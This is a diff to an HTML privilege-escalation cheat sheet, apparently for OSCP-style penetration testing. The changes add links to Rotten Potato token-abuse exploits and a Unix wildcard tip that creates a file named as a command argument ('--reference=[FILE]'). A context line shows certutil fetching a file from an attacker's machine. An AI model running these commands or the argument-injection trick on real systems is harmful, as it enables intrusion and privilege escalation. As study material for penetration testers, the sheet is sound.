@@ -514,6 +514,8 @@ certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\u
 <p><font size="3.5" color="black">- http://addaxsoft.com/wpecs/</font></p>
 <p><font size="3.5" color="black">- https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</font></p>
 <p><font size="3.5" color="black">- ADS - https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/</font></p>
+<p><font size="3.5" color="black">- Rotten Potato - https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/ (using meterpreter's incognito module - https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)</font></p>
+<p><font size="3.5" color="black">- Rotten Potato - https://decoder.cloud/2017/12/23/the-lonely-potato/ (without meterpreter)</font></p>
 <p><font size="3.5" color="black">Basic enumeration:</font></p>
 <pre style="background-color:black;color:white;">
 whoami /priv	#user's privileges on the system
@@ -529,7 +531,9 @@ SeLoadDriverPrivilege
 SeTakeOwnershipPrivilege
 SeDebugPrivilege
 
-#https://github.com/breenmachine/RottenPotatoNG		#Exploit
+#HTB Jeeves example - https://www.youtube.com/watch?v=EKGBskG8APc
+#https://github.com/foxglovesec/RottenPotato		#rottenpotato.exe exploit
+#https://github.com/breenmachine/RottenPotatoNG		#Newer exploit	
 
 PowerUp.ps1 (add 'Invoke-AllChecks' at the end of the script and invoke it)	#Powersploit
 sc query state= all type= all | findstr SERVICE_NAME	#enumerate services and drivers
@@ -575,7 +579,7 @@ sc config [SERVICE_NAME] start= auto
 net start [SERVICE_NAME]
 </pre>
 <p><font size="3.5" color="black">Linux:</font></p>
-<p><font size="3.5" color="black">* Using Unix Wildcards - https://gandosha.github.io/DefenseCode_Unix_WildCards_Gone_Wild.txt</font></p>
+<p><font size="3.5" color="black">* Using Unix Wildcards - https://gandosha.github.io/DefenseCode_Unix_WildCards_Gone_Wild.txt (To create a file use"touch -- --reference=[FILE]"</font></p>
 <p><font size="3.5" color="black">* Using NFS - https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/</font></p>
 <p><font size="3.5" color="black">LinEnum - 
 http://www.rebootuser.com/?p=1758
